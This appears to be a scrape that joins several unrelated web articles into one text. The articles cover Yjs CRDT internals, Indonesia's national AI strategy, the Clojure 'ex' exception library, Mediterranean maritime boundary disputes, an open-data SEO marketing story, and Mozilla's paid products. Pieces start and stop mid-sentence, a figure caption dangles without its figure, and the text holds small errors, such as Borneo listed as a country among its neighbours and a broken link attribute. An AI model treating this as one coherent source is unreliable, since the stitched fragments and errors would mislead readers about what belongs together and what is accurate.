Yjs also uniquely identifies each character and assigns metadata, but represents this information efficiently. Larger document insertions are represented as a single <code>Item</code> object using the character-offset to uniquely identify each character individually. The below <code>Item</code> uniquely identifies character <code>"A"</code> as <code>{ client: 1, clock: 0 }</code>, character <code>"B"</code> as <code>{ client: 1, clock: 1 }</code>, and so on..</p><figure><pre><code>Item {
    id: { client: 1, clock: 0 },
    content: 'ABC',
    ...
}</code></pre><figcaption>Yjs's internal representation of items in the linked list</figcaption></figure><p>If a user copy/pastes a lot of content into the document, the inserted content is represented by a single <code>Item</code>. Furthermore, single-character insertions that are written from left to right can be merged into a single <code>Item</code>. It is just important that we are able to split and merge items without losing any metadata.</p><p>This type of compound representation of the CRDT model and its split-functionality have first been described in <a href="https://kundoc.com/pdf-a-string-wise-crdt-algorithm-for-smart-and-large-scale-collaborative-editing-sys.html">"A string-wise CRDT algorithm for smart and large-scale collaborative systems"</a>. Yjs adapts this approach for YATA and also includes functionality to merge <code>Item</code> objects.</p><h2 id="the-cost-of-operations">The Cost of Operations</h2><p>With this simple optimization in mind, let's have a look at how the number of modifications on a document relates to the amount of metadata that needs to be retained. We will measure metadata by the amount of <code>Item</code> objects created and later examine what the cost of a single <code>Item</code> is.</p><p>Every user interaction with a text editor can be expressed as either an <strong>insert</strong> or a <strong>delete</strong> operation.</p><ul><li><code>insert(index: number, content: string)</code><strong> </strong>Insertions of any size create a single <code>Item</code> that is integrated into the document. In some cases the integration requires to split an existing <code>Item</code>. So we have a maximum of two <code>Item</code> creations per insertion.</li><li><code>delete(index: number, length: number)</code> Deleting an <code>Item</code> only marks it as deleted. I.e <code>item.deleted = true</code>. Therefore, <code>Item</code> deletions are free and will reduce the amount of memory used because the <code>Item.content</code> can be removed. The <code>Item</code> doesn't need to retain the content for doing conflict resolution. But deleting a range of content might require to split two existing items. Therefore, the cost of deletions is a maximum of two <code>Item</code> creations also.</li></ul><p>By using the compound representation of CRDTs, the amount of metadata only relates to the amount of operations produced by a user. Not to the amount of characters inserted. This makes a huge difference in practice. Most larger documents are created by copy-pasting existing content or by moving paragraphs to other positions. Any kind of operation, even copy-paste and undo/redo, only create at most two <code>Item</code> objects.</p><p>Yjs also supports rich-text and structured documents. The above statement, that the amount of metadata only relates to the amount of operations, still holds true for these kinds of documents. But measuring operation-cost for more complex operations is out of scope of this article. An interesting observation in practice is that the document size of long-running …</p></div></article></main></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>The Indonesia National AI Strategy, now known as <span><a href="https://ai-innovation.id/" target="_blank" rel="noopener noreferrer">Stranas KA</a></span> (<em>Strategi Nasional Kecerdasan Artifisial)</em>, has been published. The new strategy was announced by the <span><a href="https://en.wikipedia.org/wiki/Ministry_of_Research_and_Technology/National_Research_and_Innovation_Agency_(Indonesia)" target="_blank" rel="noopener noreferrer">Minister of Research and Technology</a></span> and head of the <a href="https://www.ristekbrin.go.id/" target="_blank" rel="noopener noreferrer"><span>BRIN</span></a> (the National Research and Innovation Agency) <span><a href="https://en.wikipedia.org/wiki/Bambang_Brodjonegoro" target="_blank" rel="noopener noreferrer">Bambang PS Brodjonegoro </a></span>in an television address made last Monday to mark the country’s 25th National Technology Awakening Day. The minister also launched an electronic innovation catalogue, helping Indonesian technology developers to market their offerings and sell to government procurement offices.</p>
<p>Transforming Indonesia into a Fourth Industrial Revolution economy has become focus for the government over the past few years and the necessity of creating a digital-savvy workforce has become a top priority. Stranas KA aims to tie together many of the country’s digital initiatives and maps closely to <em><span><a href="https://en.wikipedia.org/wiki/Vision_of_Indonesia_2045" target="_blank" rel="noopener noreferrer">Visi Indonesia 2045</a></span></em>, the country’s broad economic, social, governance and technology development strategy. The National Artificial Intelligence Strategy Framework provides an at-a-glance view of how these different goals are held in context.</p>
<p>Stranas KA aims to support five national priorities, where the government believes that artificial intelligence could have the biggest impact on national progress and outcomes.</p>
<p><strong>Health services</strong> – With 268 million people living across 6,000 of Indonesia’s total 17,504 islands, delivering a consistent standard of healthcare is a national challenge. The archipelago also faces increased risks from global disease outbreaks such as SARS and, recently, Covid-19. The country’s response to the pandemic has already somewhat accelerated plans for smart hospitals and health security infrastructure.</p>
<p><strong>Bureaucractic reform</strong> – With a civilian civil service of about 4 million, reforming the government’s highly centralised administration remains a significant challenge. Indonesia is lagged in implementation of digital services, according to the United Nations <a href="https://www.un.org/development/desa/publications/publication/2020-united-nations-e-government-survey" target="_blank" rel="noopener noreferrer"><span>E-Government Development Index (EGDI)</span></a>, ranking below Borneo, Malaysia, Singapore, Thailand and Vietnam. President <span><a href="https://en.wikipedia.org/wiki/Joko_Widodo" target="_blank" rel="noopener noreferrer">Joko Widodo</a></span> has promised to create a citizen-centric digitised service government <em>(Pemerintahan Digital Melayani)</em> in the next five years.</p>
<p><strong>Education and research</strong> – Education is integral to Visi Indonesia 2045 and the move towards online schooling during the Covid-19 pandemic has laid bare the country’s digital divide. The pressures of the digital economy are also recognised by development plans. According to the government, Indonesia needs a digital workforce of 113 million by 2030-2035.</p>
<p><strong>Food security</strong> – According to President Widodo, food security remains Indonesia’s top priority and the Food Security Agency focuses on three main areas: food availability, food accessibility and food utilisation. Food, agriculture and fisheries government departments and agencies have already begun using satellite technology, machine learning and smart farming to better plan, forecast and manage agricultural production and natural resources.</p>
<p><strong>Mobility and smart cities</strong> – The number of people living in Indonesia’s urban areas is now close to 60 percent and is expected to rise to 70 percent of the total population by the year 2050. The government currently plans to develop 98 smart cities and 416 smart districts, under Indonesia’s 100 Smart Cities Plan.</p>
<p><a href="https://www.carringtonmalin.com/wp-content/uploads/2020/08/Indonesia-National-AI-Strategy-10Aug20.png"><img loading="lazy" src="https://www.carringtonmalin.com/wp-content/uploads/2020/08/Indonesia-National-AI-Strategy-10Aug20.png" alt="Indonesia National AI Strategy, August 2020" width="1191" height="701" srcset="https://www.carringtonmalin.com/wp-content/uploads/2020/08/Indonesia-National-AI-Strategy-10Aug20.png 1191w, https://www.carringtonmalin.com/wp-content/uploads/2020/08/Indonesia-National-AI-Strategy-10Aug20-640x377.png 640w, https://www.carringtonmalin.com/wp-content/uploads/2020/08/Indonesia-National-AI-Strategy-10Aug20-1024x603.png 1024w, https://www.carringtonmalin.com/wp-content/uploads/2020/08/Indonesia-National-AI-Strategy-10Aug20-320x188.png 320w" sizes="(max-width: 1191px) 100vw, 1191px"></a></p>
<p>Meanwhile, the Indonesia national AI strategy identifies four key focus areas:</p>
<ol>
<li>
<ol>
<li>Ethics and Policy</li>
<li>Talent Development</li>
<li>Infrastructure and Data</li>
<li>Industrial Research and Innovation</li>
</ol>
</li>
</ol>
<p>Indonesia is already one of South East Asia’s biggest investors in artificial intelligence, with IDC’s 2018 <span><a href="https://www.idc.com/ap/pulse/2018-november" target="_blank" rel="noopener noreferrer">Asia-Pacific Enterprise Cognitive/AI survey</a></span> finding that 25 percent of large organisations in the country have adopted AI systems (compared with 17% in Thailand, 10% in Singapore and 8% in Malaysia).</p>
<p>Smart cities, one of Stranas KA’s five top priority areas, have been identified as a fundamental building block for Indonesia’s Industry 4.0 future. Last year President Widodo announced plans to create a new futuristic smart city capital on the island of Borneo, to replace Jakarta. The <span><a href="https://www.thejakartapost.com/news/2019/12/23/nagara-rimba-nusa-announced-as-winner-of-new-capital-city-design-contest.html" target="_blank" rel="noopener noreferrer">new capital</a></span> will rely heavily on sustainable smart city systems, cleantech and infrastructure run by emerging technologies such as 5G, AI and IoT (Internet of Things). Originally slated for completion by 2024 (pre-pandemic) and estimated to cost $33 billion, the project reportedly received an offer by Japanese multinational investor <a href="https://en.wikipedia.org/wiki/SoftBank_Group" target="_blank" rel="noopener noreferrer">SoftBank Group</a> to invest up to $40 billion.</p>
<p>The Indonesia National AI Strategy details a programme roadmap for both its four key focus areas and the five national priorities, for which it considers plans as short-term (2020-2024) and longer-term (2025-2045). All in all, the strategy document identifies 186 programmes, including many that aim to develop the plans, pilot schemes, policies and regulations, plus checks and balances, necessary to drive the overall strategy.</p>
<p>Underpinning the acceleration of Indonesia’s artificial intelligence journey, Stranas KA includes plans for national standards, regulations and an ethics board to ensure that usage of AI is in accordance with the country’s <em><a href="https://en.wikipedia.org/wiki/Pancasila_(politics)" target="_blank" rel="noopener noreferrer">Pancasila</a> </em>values system.</p>
<p>The development of the 194-page National Artificial Intelligence Strategy was coordinated by the Agency for the Assessment and Application of Technology or <span><a href="https://www.bppt.go.id/" target="_blank" rel="noopener noreferrer">BPPT</a></span>, a non-ministerial government agency under the coordination of the Ministry for Research and Technology, and was widely anticipated to be announced in July or August. A wide variety of public and private sector organisations contributed to the plan including government ministries, universities, industry associations and national telecom providers.</p>
<p>Although many of the programmes and initiatives detailed in the Indonesia National AI Strategy can be found in existing government strategies, plans and policy, Stranas KA is nevertheless highly ambitious. The success of the overall plan will likely rest heavily on how many of the foundation programmes it is able to get off the ground during the next 4-5 years.</p>

<p>I always had troubles managing errors in Clojure until I discovered <a href="https://github.com/exoscale/ex">ex</a> (written by a coworker, thanks to him :p). This library was a game changer for me.</p>
<p><code>ex</code> allows you to define exception types in the ex data by setting the <code>:exoscale.ex/type</code> key. You can then use the <code>try+</code> macro to catch Exceptions with a given type, like in this example:</p>
<div>
<div>
<pre><code data-lang="clojure">(ex/try+

  (throw (ex-info "Argh" {:type ::bar :foo "a foo"}))

  (catch ::foo data
    (prn :got-ex-data data))

  (catch ::bar {:as data :keys [foo]}
    ;; in that case it would hit this one
    (prn :got-ex-data-again foo))

  (catch ExceptionInfo e
   ;; this would match an ex-info that didn't get a hit with catch-ex-info)

  (catch Exception e (prn :boring))

  (finally (prn :boring-too))</code></pre>
</div>
</div>
<p><code>ex</code> also provides default types like <code>:exoscale.ex/not-found</code>, <code>:exoscale.ex/forbidden</code> and helper functions to create exceptions (like <code>(exoscale.ex/ex-not-found "not found !" {:foo "bar"})</code> to create an exception of type <code>:exoscale.ex/not-found</code>, or <code>exoscale.ex/ex-not-found!</code> to create and throw it).</p>
<p><code>ex</code> also allows you to derive exceptions types from other types.<br>
Let’s take an example. You might want have multiple types for authentication errors, like <code>::invalid-api-key</code> or <code>::invalid-token</code>, but make them all derive from <code>::ex/forbidden</code> to be able to convert them easily to an HTTP response:</p>
<div>
<div>
<pre><code data-lang="clojure">(ex/derive ::invalid-api-key ::ex/forbidden)
(ex/derive ::invalid-token ::ex/forbidden)

(defmulti ex-&gt;response
  (fn [e]
    (some-&gt; e ex-data :type))
  :hierarchy exoscale.ex/hierarchy)

(defmethod ex-&gt;response ::ex/forbidden [e]
  {:body (ex-message e)
   :status 403})

(defmethod ex-&gt;response ::ex/not-found [e]
  {:body (ex-message e)
   :status 404})

(defmethod ex-&gt;response :default [_]
  {:body "default error message"
   :status 500})</code></pre>
</div>
</div>
<p>Let’s generate some errors:</p>
<div>
<div>
<pre><code>(ex-&gt;response (ex/ex-not-found "thing not found"))
{:body "thing not found", :status 404}

(ex-&gt;response (ex-info "invalid token" {:type ::invalid-token}))
{:body "invalid token", :status 403}

(ex-&gt;response (ex-info "invalid api key" {:type ::invalid-api-key}))
{:body "invalid api key", :status 403}

(ex-&gt;response (ex-info "error !" {}))
{:body "default error message", :status 500}</code></pre>
</div>
</div>
<p>You can do tons of things with this library !</p>

<h2>Or, Why is Mediterranean Maritime Sovereignty So Complicated?</h2>



<p>The Mediterranean Sea could almost be considered an inland body of water, except for a small connection to the Atlantic Ocean (only 16 km or 10 miles) between the coasts of Spain and Morocco at the Strait of Gibraltar. The waters of the Mediterranean can be further divided into the Alboran, Libyan, Levantine, Aegean, Ionian, Adriatic, Tyrrhenian, and Balearic Seas. Twenty-three separate States lay claim to the waters of the Mediterranean Sea, and many of these are overlapping or disputed leading to an incredibly complex picture of maritime sovereignty.</p>



<h2>The Established Boundaries</h2>



<p>There are, however, twenty-two established maritime boundaries between the various Mediterranean States. The oldest is between Cyprus and the UK on behalf of its Sovereign Base Areas (SBAs) of Akrotiri and Dhekelia located in the south of the island. Both the land and maritime boundaries between the SBAs and Cyprus were established by the same agreement from which Cyprus gained its independence from the UK on 16 August 1960. The <a href="https://sovereignlimits.com/boundaries/cyprus-united-kingdom-maritime" target="_blank" rel="noreferrer noopener">maritime boundary</a> extends in four separate parts from the various land boundary termini on the coast and delimits the UK’s claimed three nautical mile territorial sea and Cyprus’s 12. The UK ceded all exclusive economic zone (EEZ) claims to Cyprus.</p>

<p>The most recent (as of late July 2020) Mediterranean maritime boundary is between Greece and Italy, signed on 9 June 2020. This new agreement updates a 24 May 1977 Treaty, transforming the already-established 16 point maritime boundary into WGS-84 and confirming its application for the EEZ, in addition to the continental shelf (CS). The 2020 update left the tripoints, with Albania in the north and Libya in the south, undefined. The Italy–Greece boundary is arguably less interesting than the second most recent Mediterranean maritime boundary between Turkey and Libya (signed 27 November 2019). That will be covered in greater depth below.</p>



<div><figure><img loading="lazy" width="749" height="1024" src="https://sovereignlimits.com/wp-content/uploads/sites/2/2019/04/Greece_Italy-01-749x1024.png" alt="A map depicting the maritime boundary between Greece and Italy." srcset="https://sovereignlimits.com/wp-content/uploads/sites/2/2019/04/Greece_Italy-01-749x1024.png 749w, https://sovereignlimits.com/wp-content/uploads/sites/2/2019/04/Greece_Italy-01-219x300.png 219w, https://sovereignlimits.com/wp-content/uploads/sites/2/2019/04/Greece_Italy-01-44x60.png 44w, https://sovereignlimits.com/wp-content/uploads/sites/2/2019/04/Greece_Italy-01-768x1050.png 768w, https://sovereignlimits.com/wp-content/uploads/sites/2/2019/04/Greece_Italy-01-600x821.png 600w, https://sovereignlimits.com/wp-content/uploads/sites/2/2019/04/Greece_Italy-01.png 1123w" sizes="(max-width: 749px) 100vw, 749px"><figcaption><em>Greece and Italy’s original 1977 maritime boundary was updated to WGS-84 in 2020.</em></figcaption></figure></div>

<p>Surprise! Greece and Egypt signed a new EEZ boundary Agreement on Thursday, August 6. The details have not yet been released to the public, but both Turkey and Libya have already protested the new boundary.</p>



<p>The shortest established Mediterranean maritime boundary is between <a href="https://sovereignlimits.com/boundaries/italy-slovenia" target="_blank" rel="noreferrer noopener">Italy and Slovenia</a> at 15 M and the longest is between <a href="https://sovereignlimits.com/boundaries/italy-tunisia" target="_blank" rel="noreferrer noopener">Italy and Tunisia</a>, which runs for 528 M.</p>



<p>That leaves about 30 maritime boundaries to be established, some of which are currently being negotiated (Greece and Albania) and some of which have 300 plus years of dispute that will need to be resolved before maritime boundary delimitation can begin (Spain and the UK on behalf of Gibraltar).</p>



<h2>Disputed Maritime Space</h2>



<p>When looking at disputed maritime areas in the Mediterranean, Turkey is the shadow over all of the eastern Sea. Its role in the Cyprus–Northern Cyprus conflict as well as the full extent of maritime disputes with Greece will be discussed in greater detail below. This section is to delve into Turkey’s full set of unilateral maritime claims which were updated in 2019.</p>



<div><figure><img loading="lazy" width="1024" height="576" src="https://sovereignlimits.com/wp-content/uploads/sites/2/2020/08/Turkey_Claims_v2-01-1-1024x576.png" alt="Map showing Turkey's unilateral maritime claim, overlaid with established maritime boundaries and provisional equidistance lines from Sovereign Limits." srcset="https://sovereignlimits.com/wp-content/uploads/sites/2/2020/08/Turkey_Claims_v2-01-1-1024x576.png 1024w, https://sovereignlimits.com/wp-content/uploads/sites/2/2020/08/Turkey_Claims_v2-01-1-300x169.png 300w, https://sovereignlimits.com/wp-content/uploads/sites/2/2020/08/Turkey_Claims_v2-01-1-60x34.png 60w, https://sovereignlimits.com/wp-content/uploads/sites/2/2020/08/Turkey_Claims_v2-01-1-768x432.png 768w, https://sovereignlimits.com/wp-content/uploads/sites/2/2020/08/Turkey_Claims_v2-01-1-1536x865.png 1536w, https://sovereignlimits.com/wp-content/uploads/sites/2/2020/08/Turkey_Claims_v2-01-1-2048x1153.png 2048w, https://sovereignlimits.com/wp-content/uploads/sites/2/2020/08/Turkey_Claims_v2-01-1-600x338.png 600w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><em>This map depicting extensions of Turkey’s EEZ claims was released by a Turkish diplomat in December 2019 (the map source and more information is from this <a href="https://www.hurriyetdailynews.com/map-delineates-turkeys-maritime-frontiers-in-med-sea-149379" target="_blank" rel="noreferrer noopener">article</a>). To capture the complicated nature of all of the other claims and established maritime boundaries, we’ve overlaid Sovereign Limits maritime data over top.</em> Between points A and B is the established maritime boundary with Northern Cyprus and between points E and F the new line with Libya.</figcaption></figure></div>



<p>Additionally, on 27 November 2019, Turkey and the UN-backed government of Libya (Libya is in the midst of a civil war, so yes, there are two entirely separate governments) signed a short, two-point maritime boundary agreement that dangles in the middle of Greek-claimed sea. This new boundary enraged neighboring Greece and Egypt as well as the entire EU. Its location deviates from the equidistance default stipulated by UNCLOS. Turkey and Libya note that the bilaterally negotiated boundary has nothing to do with third states, but as Greece claims the waters surrounding this new delimitation, it has caused quite a stir. The new August 2020 Egypt–Greece maritime boundary likely overlaps with the Libya–Turkey boundary in some capacity.</p>



<p>The conflict between Cyprus and Northern Cyprus would not have reached its modern outcome without Turkish involvement. Disagreements between Turkish Cypriots and Greek Cypriots on the island of Cyprus have been ongoing since even before Ottoman control of the island, and the modern conflict began shortly after independence from the United Kingdom. Turkey moved to occupy northern Cyprus in 1974 and the Turkish Republic of Northern Cyprus declared independence in 1983. Today, Turkey is the only country who recognizes Northern Cyprus’s statehood.</p>



<p>The island of Cyprus is now divided by a UN mandated and monitored buffer zone that snakes its way through hilly territory and divides the capital city (for both Cypruses) of Nicosia. The southern Greek Republic of Cyprus is an EU member and is recognized by the UN as the sole sovereign power of the island.</p>



<p>Related to the Cyprus dispute, the maritime picture off the coast of the island is quite complicated. The Republic of Cyprus has established maritime boundaries with <a href="https://sovereignlimits.com/boundaries/cyprus-egypt" target="_blank" rel="noreferrer noopener">Egypt</a>, <a href="https://sovereignlimits.com/boundaries/cyprus-israel" target="_blank" rel="noreferrer noopener">Israel</a>, and <a href="https://sovereignlimits.com/boundaries/cyprus-lebanon" target="_blank" rel="noreferrer noopener">Lebanon</a>, in addition to the short UK boundaries already mentioned. Northern Cyprus agreed to a maritime boundary with Turkey, that the southern Republic of Cyprus disputes. Due to the nature of the dispute, the maritime boundaries between Cyprus and Northern Cyprus are also unresolved (and unlikely to become so in the foreseeable future).</p>



<p>Turning to the maritime disputes between Turkey and neighboring Greece offers an even more complicated picture (at least delimitation wise) due to the multitude of Greek Islands that lay just off the Turkish coast. Relations between Turkey and Greece have been historically complicated and often quite problematic, negativity driven by both the conflict in Cyprus and unresolved maritime issues in the Aegean Sea. Oil was discovered in the continental shelf in 1973, adding [literal] fuel to the fire.</p>

Turkey’s proposed maritime boundary lies to the west of equidistance.</em></figcaption></figure>



<p>Greece and Turkey have two extremely different perspectives on the possible delimitations of the maritime boundary through the Aegean Sea. Turkey is not a signatory of UNCLOS and claims that Greece’s Aegean Islands are not entitled to full continental shelf claims and would seek to have a mainland coast equidistance boundary through the middle of the Aegean Sea, while enclaving the Greek islands on the Turkish side of the maritime boundary line. Greece, a signatory of UNCLOS, meanwhile proposes a strict equidistance-based maritime boundary utilizing all of its islands, pushing the maritime boundary far to the east, just off the Turkish coast. Turkey’s position on the Greek claim is that this would create a “Greek Lake” of the Aegean Sea and severely limit Turkey’s freedom of navigation from the Black Sea to the Mediterranean.</p>



<p>There is also at least one officially disputed island between Turkey and Greece known as Imia by the Greeks and Kardak by the Turks. Turkish claims to additional islands have been made and redacted over the years.</p>



<p>Conflict over Greek and Turkish maritime claims is common. During the summer of 2020, Turkey has been conducting seismic surveys in Greek-claimed waters. And Greece is working on increasing its military power in response to Turkish aggression. Meanwhile, diplomats from the two states also sat down for a round of negotiations. In August, Greece called for talks to continue or a referral of the dispute to the ICJ.

<p>Looking beyond Turkey-centered disputes, there is a handful of interesting and impossible to resolve conflicts that speckle the entire Mediterranean Sea and neighboring bodies of water. Israel and Lebanon seem to be constantly in conflict over both their unresolved <a href="https://sovereignlimits.com/boundaries/israel-lebanon-land" target="_blank" rel="noreferrer noopener">land boundary</a> and maritime frontier. Natural gas reserves have been discovered in maritime space that both states claim, and in 2018 Lebanon auctioned off several disputed oil blocks. Israel is currently working on its own oil exploration in the disputed area.</p>



<p>The Palestinian territory of Gaza set forth maritime claims in 2015 and 2019 in which they proposed lateral boundaries with Egypt and Israel, creating a corridor of Palestinian maritime space before reaching the boundary with Cyprus. Both Israel and Egypt have submitted protests to the UN over Palestine’s unilateral maritime claims.</p>

<p>The former Yugoslav States of Croatia and Slovenia also have disputed maritime space in the northern Adriatic Sea despite a <a href="https://sovereignlimits.com/boundaries/croatia-slovenia" target="_blank" rel="noreferrer noopener">2017 Permanent Court of Arbitration Award</a> delimiting the boundary (Croatia had unilaterally withdrawn from the case in 2015 following a scandal). Slovenia accepts the Tribunal’s delimitation, but Croatia does not.</p>



<p>Some similarities can be drawn to the maritime boundary between Greece and Albania in the southern reaches of the Adriatic Sea. The two States signed a maritime boundary agreement in 2009, but this document was annulled shortly thereafter by Albania. Negotiations over the maritime boundary began again in 2018 and are ongoing. And with Greece’s current dedication to maritime boundary delimitation with its neighbors it is plausible that a new Greece–Albania maritime boundary Agreement …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Read about how we were able to use publicly available data to create large amounts of content and take our marketing to the next level.</p>

<h2 id="why-should-you-read-this">Why Should You Read This?</h2>
<p>Are you in the process of starting a SaaS, e-commerce store or a local business? Then I think this story can help you develop a strategy to get your first hundred dollars MRR without spending tons of money on marketing. Lets begin.</p>
<h3 id="we-had-a-product-without-traffic-what-to-do">We Had a Product Without Traffic, What to Do?</h3>
<p>One of the first products we developed was an online preparation course for the Swedish SAT test. We created thousands of practice questions, hired math experts to write tutorials and spent a lot of time creating optimized landing pages. However, the traffic never came. This was our start.</p>
<p><img src="https://mocki.io/hpskolan.png" alt="Swedish SAT" title="Swedish SAT"></p>
<p>At the stage we were at, I think a lot of developers creating their own products give up. Developers can spend an insane amount of time creating a product <strong>THEY</strong> like. But unfortunately we are not good at selling our products or showing them to users in a way that make them interested.</p>
<p>We started thinking what people actually search for in regards to the Swedish SAT and college education. After doing some analysis we noticed that a lot of people used search queries like:</p>
<ol>
<li>What SAT score is required to get into Law at Stockholm university?</li>
<li>What SAT score is required to get into any Law school in Sweden?</li>
<li>What SAT score is required to get into Computer Science at Linköping university?</li>
<li>Which education in Sweden was the hardest to get into?</li>
<li>Which education had the most applications 2015?</li>
</ol>
<p>You see these are all related to education. And we figured out that a lot of people searching for these things are interested in improving their SAT test score. So how did we use this? We could have started writing articles like crazy about each education programme, but that would be really time consuming. Instead we approached the problem like developres and started to look at how we could actually generate one page with this kind of data for each education in Sweden.</p>
<h3 id="open-data-apis--the-golden-egg-">Open Data APIs - the Golden Egg 🥚</h3>
<p>This is where things start to become interesting. Open data APIs! At Mocki we are very supportive of governments and organizations opening up their data publicly. It's an amazing way to let normal companies or people develop applications that never would have been developed otherwise. Our interest in open data started that day when we got our hands on application data for every education in Sweden.</p>
<p>For a specific education programme we were able to see</p>
<ol>
<li>The number of applicants.</li>
<li>The number of accepted people.</li>
<li>The required SAT score to get accepted.</li>
<li>The percentage of women/men</li>
<li>The percentage of Swedish/Non-Swedish people.</li>
<li>And a lot more…</li>
</ol>
<p>Suddenly we were able to answer all the questions mentioned earler. We also realised that we could create a website out of this. So that's what we did. At that time there wasn't much competition for these search queries either which was great.</p>
<p>This is a screenshot of some of the data for med school and Lund University. One of the most popular universities in Sweden. It may be hard for a non Swede to understand what the data means. But that's not important here. The important thing is that we created pages with hundreds of words, graphs and tables all automatically generated.</p>
<p><img src="https://mocki.io/antagningspoang.png" alt="Swedish SAT" title="Med school Lund"></p>
<h3 id="could-this-be-considered-spam">Could This Be Considered Spam?</h3>
<p>If you use this tactic in the wrong way with randomized data or just non useful information it's not good. But we knew that this was data people really wanted to find! All the generated texts were useful and provided great user value. And modern day search engine optimization really comes down to providing great value for a <strong>user</strong>.</p>
<p>This was all confirmed when Google started picking up the pages and loved them. We quickly started ranking on all sorts of keywords related to SAT. In just a couple of weeks we reached traffic numbers of around 10 000 users per month and it kept steadily increasing each day. All user metrics were amazing. Long average time spent on page and many interactions with the graphs. We also noticed people visiting several different pages because they got hooked on seeing all the different graphs we provided.</p>
<h3 id="the-final-step">The Final Step</h3>
<p>So we had suddenly created our own traffic source with relevant users. We started putting up banners on the site with the SAT data leading directly to our SAT prep SaaS. The results were great! We got a lot of signups and had to go back working on our course platform since the users discovered bugs and other problems. But we now had a steady flow of new paying customers. That's where you want to be because that is when a SaaS becomes fun.</p>
<h3 id="how-can-you-use-open-data-apis-to-do-the-same">How Can You Use Open Data Apis to Do the Same?</h3>
<p>This strategy may not be applicable for every service out there. But I will try to create one other example where I think this could work.</p>
<p>Lets say you own a snow shoveling business and you are currently expanding to a lot of different cities. Then I think you could combine this strategy with using local SEO.</p>
<ol>
<li>Use an open API to get all cities in your country with more than x amount of people</li>
<li>Try to find some weather API providing detailed data about if its going to snow</li>
<li>Try to find historical snow data for every city.</li>
</ol>
<p>So what can we do with with this data? We can generate something like the following text</p>
<p>“What is the snow situation town X right now? - Snow shoveling forecast”,</p>
<p>“Town with X with Y inhabitants usually has around Z number of snow days per year. The temperature in September to February is between K degrees. On our snow and ice scale town X has the score of S (scould be calculated by an algorithm that you create). You will probably have to shovel snow around D days per winter.”</p>
<p>“It's currently heavily snowing in town X, so be prepared to shovel snow the next D days.”</p>
<p>Each page would be both useful and kind of unique. It's important to make sure to have enough variables as Google might think its duplicate content otherwise. When you have created these pages you now have a local snow shoveling page for a lot of cities. Put up your phone number or a link to your booking system and start scaling your snow shoveling business.</p>
<p>There are probably a lot of better examples, but I hope I gave you enough to get thinking :)</p>
<h3 id="create-an-open-api-and-start-sharing-your-data">Create an Open API and Start Sharing Your Data!</h3>
<p>If you are a government, organization or just a company with some great data set you should think about sharing it. In some cases the data is your business and then it's of course not the best idea. But in a lot of cases there is not much to lose. In Scandinavia where Mocki is founded the governments are currently doing great efforts to make data publicly available. There are a lot of applications that will never be developed by governments and state organizations but that companies or hobby programmers would love to create.</p>
<p>Lets say your government would release all the data on every traffic accident in your country, including the location and severity. Then you could create an app warning about historically dangerous roads. It's these types of things that become possible when the data is released to the public.</p>
<p>With Mocki it's very easy to create a simple API with mock data or real data. You can for example use Mocki if you want to make some of you data available to a hackathon or other event. It's a good and safe start as you wouldn't need to expose any of your own infrastructure or sensitive data sources. If that sounds interesting you can sign up with GitHub or send us a message to the bottom right.</p>
<p>Cheers!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>With Mozilla Corporation laying off about 350 employees since the beginning of 2020, things don't look bright for Firefox, the only cross-platform browser providing any alternative to Google's Chrome(ium) monopoly. While they're not going away for the next few years at least, I believe it is also clear that they need to diversify their income pretty urgently. Here's how I hope to see them bouncing back.</p><h2 id="mozilla-foundation-vs-mozilla-corporation">Mozilla Foundation vs. Mozilla Corporation</h2><p>Since I see the confusion around this happening way too often, I want to start off by explaining the difference between the Mozilla Foundation (MoFo) and the Mozilla Corporation (MoCo).</p><p>MoCo was created as a subsidiary of the MoFo almost exactly 15 years ago. It's in charge of developing all the Mozilla's products: Firefox, Pocket, and others. All of its profits are going straight to MoFo, and nobody else owns any part of it (no other shareholders, no stocks, no dividents).</p><p>This structure allows MoCo to pursue business partnerships and deals that are hard or impossible to do in a non-profit, but as a consequence, you can't donate money to a corporation. That's why the donations to Mozilla go to the Foundation, which mostly does advocacy, finances fellowships, and similar, meaning that you can't donate directly to the Firefox development.</p><!--kg-card-begin: markdown--><p><strong>Disclaimer:</strong> I was a Ford-Mozilla Open Web Fellow in 2017/2018, during which I was an employee of <a href="https://www.bitsoffreedom.nl/">Bits of Freedom <i></i></a>, with my sallary being sponsored by the by MoFo and the <a href="https://www.fordfoundation.org/">Ford Foundation <i></i></a>.</p><br><!--kg-card-end: markdown--><h2 id="how-you-can-give-money-to-the-mozilla-corporation-today">How you can give money to the Mozilla Corporation today</h2><p>MoCo currently has three B2C (business-to-consumer) products that you can purchase.</p><!--kg-card-begin: markdown--><p>The oldest of them is <a href="https://getpocket.com/premium">Pocket Premium <i></i></a> ($4.99/month). While Pocket is definitely more than usable without paying anything, it has some features that are exclusive to its premium members. Since Pocket is owned by the MoCo (which is itself owned by MoFo), money spent towards its premium account counts as a revenue gained by the corporation that's in charge of developing Firefox.</p>
<p>The second B2C product a newly-released <a href="https://vpn.mozilla.org/">Mozilla VPN <i></i></a> (also $4.99/month), currently available in only 6 countries (the US, the UK, Canada, New Zealand, Signapore, and Malasyia), though that list should expand later in the year.</p>
<p>The last one is <a href="https://fpn.firefox.com/">Firefox Private Network</a> ($2.99), which is more like a proxy than a VPN. If you decide to use it, all of your Firefox traffic gets routed through some Cloudflare server (you can't choose your location like you can with a VPN). It's currently only available in the US.</p>
<p>All in all, Mozilla would need quite a large amount of paid users to support their development. Then there are other smaller, free-to-use products:</p>
<ul>
<li><a href="https://monitor.firefox.com/">Firefox Monitor <i></i></a>, which checks if some of your email addresses were a part of some breach (in cooperation with <a https:="" input.sh="" mozilla-subscription-service-pack="" href="">Have I Been Pwned <i></i></a>).</li>
<li><a href="https://www.mozilla.org/en-US/firefox/lockwise/">Firefox Lockwise <i></i></a>, which is a password manager rivalling the likes of Bitwarden, LastPass, 1password, etc.</li>
<li><a href="https://send.firefox.com/">Firefox Send <i></i></a>, which is an end-to-end encrypted file sharing web service. (Note: at the time of writing this, Mozilla shut it down because it was increasingly used for Malware transfer, but they're planning on bringing it back online.)</li>
<li><a href="https://addons.mozilla.org/en-US/firefox/addon/notes-by-firefox/">Firefox Notes <i></i></a>, an experimental end-to-end encrypted note taking app that allows you to take notes on your desktop and your Android/iOS device.</li>
</ul>
